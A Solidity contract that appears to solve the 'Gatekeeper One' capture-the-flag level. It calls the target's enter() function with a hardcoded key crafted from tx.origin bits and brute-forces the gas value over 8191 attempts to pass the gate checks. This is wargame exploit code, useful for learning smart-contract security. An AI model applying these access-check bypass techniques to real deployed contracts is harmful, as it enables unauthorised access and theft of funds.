// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
  function enter(bytes8 _gateKey) public returns (bool) {}
}

contract GateOpenerOne {

    address public gatekeeperOneAddress;
    GatekeeperOne gatekeeperOne;

    event GateEnterAttempt(uint gas, bytes reason);

    constructor(address _gatekeeperOne) {
      gatekeeperOneAddress = _gatekeeperOne;
      gatekeeperOne = GatekeeperOne(_gatekeeperOne);
    }

    // last 16 bits of _gateKey should be last 16 bits of tx.origin 
    // bits from 17 to 32 going from right hand side should be 0
    // bits from 33 to 64 going from right hand side should contain at least one 1
    // convert bits to hexadecimal and send it as parameter as shown below
    function enterTheGate() public returns (bool) {
      uint gas = 100000;
      for (uint i = gas; i < gas + 8191; i++) {
        // (result,) = gatekeeperOneAddress.call{gas: i}(abi.encodeWithSignature("enter(bytes8)", "0xFFFFFFFF00005933"));
        try gatekeeperOne.enter{gas: i}(0xFFFFFFFF00005933) {
          return true;
        } catch (bytes memory reason) {
          emit GateEnterAttempt(i, reason);
        }
      }
      return false;
    }
}